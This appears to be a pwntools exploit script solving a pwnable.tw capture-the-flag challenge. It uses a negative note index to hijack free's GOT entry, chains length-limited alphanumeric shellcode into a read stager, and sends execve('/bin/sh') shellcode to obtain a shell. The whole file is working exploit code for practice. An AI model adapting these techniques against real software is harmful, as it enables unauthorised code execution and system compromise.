###shellcoding with length limits

from pwn import *

###Utils
def create(idx,data):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Index :',str(idx))
    r.sendafter('Name :',data)

def show(idx):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',str(idx))
    res = r.recvuntil('--------')[:-8]
    return res

def delete(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(idx))

def pad():
    for i in range(3):
        create(-1,'a'*8)

###Payload for read
payload1 = asm('''
                push eax
                pop ecx     #Set ecx to start of deleted note
                push 0x41
                pop eax
                inc ebp     #Padding
                /*jno 0x40*/
                ''') 
payload1+=b'q8'
payload2 = asm('''
                xor al, 0x41
                dec eax     #eax = 0xffffffff
                inc ebp     #Padding
                inc ebp     #Padding
                inc ebp     #Padding
                /*jno 0x40*/
                ''')
payload2+=b'q8'
payload3 = asm('''
                xor [ecx+0x46],al   #Craft `int` (0xcd)
                xor al, 0x39
                inc ebp             #Padding
                /*jno 0x40*/
                ''')
payload3+=b'q8'
payload4 = asm('''
                xor [ecx+0x47],al   #Craft  `0x80`
                push 0x7a
                pop edx             #edx = 0x7a = size
                /*jno 0x40*/
                ''')
payload4+=b'q8'
payload5 = asm('''
                push 0x37
                pop eax
                xor al,0x34         #eax = 3
                inc ebp             #Padding
                ''')+b'\x32\x46'

###Payload for execve
#  Note : Could use asm(shellcraft.sh()) to generate instead
#  /bin/sh
#  2F 62 69 6E 2F 73 68 00
padding = b'\x90'*0x48      #Align shellcode after read shellcode
shellcode = asm('''
                push 0x0068732F
                push 0x6E69622F
                mov eax, 0xb
                mov ebx, esp
                xor ecx, ecx
                xor edx, edx
                xor esi, esi
                int 0x80
                ''')
payload = padding+shellcode

###Exploit
r = remote('chall.pwnable.tw',10300)

###Hijack free got
create(-27,payload1)
pad()
create(0,payload2)
pad()
create(1,payload3)
pad()
create(2,payload4)
pad()
create(3,payload5)
delete(2)

###Send execve shellcode
r.send(payload)

###Get shell
r.interactive()
